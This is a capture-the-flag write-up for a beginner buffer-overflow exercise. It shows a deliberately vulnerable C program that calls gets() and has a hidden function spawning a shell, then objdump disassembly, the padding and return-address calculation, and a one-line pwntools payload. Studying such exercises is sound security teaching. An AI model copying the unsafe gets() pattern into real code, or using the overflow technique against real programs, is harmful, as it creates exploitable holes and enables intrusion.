<h1>Baby BOF</h1>

First we can look at the babybof.c and see what we have:
  
  ```C
  
  #include<stdio.h>

  void you_cant_see_this_its_too_evil(){
      system("sh");
  }

  int main(){
      setvbuf(stdout,0,2,0);
      puts("Welcome to NCU AD 2017 Fall, Im yuawn :)");

      char buf[20];
      gets( buf );

      return 0;
  }
  ```
  
It is obvious that `gets( buf )` is the key to overflow.

For the next step, we will be to `objdump` to disassemble the program.
  
    000000000040064d <you_cant_see_this_its_too_evil>:
    40064d:	55                   	push   %rbp
    40064e:	48 89 e5             	mov    %rsp,%rbp
    400651:	bf 38 07 40 00       	mov    $0x400738,%edi
    400656:	b8 00 00 00 00       	mov    $0x0,%eax
    40065b:	e8 b0 fe ff ff       	callq  400510 <system@plt>
    400660:	5d                   	pop    %rbp
    400661:	c3                   	retq   

We can clearly see the address of the hidden function `you_cant_see_this_its_too_evil` is `0x40064d` and this will be our return address.

    400692:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
    400696:	48 89 c7             	mov    %rax,%rdi
    400699:	e8 a2 fe ff ff       	callq  400540 <gets@plt>
   
We also can see in `main` that `gets( buf )` starts to store to `-0x20(%rbp)` which equals to `rbp - 0x20`.

Therefore, our padding would be `0x28` bytes.

In the end, our playload will be:

```Python
b"A"*0x28 + p64(0x040064d)  
```

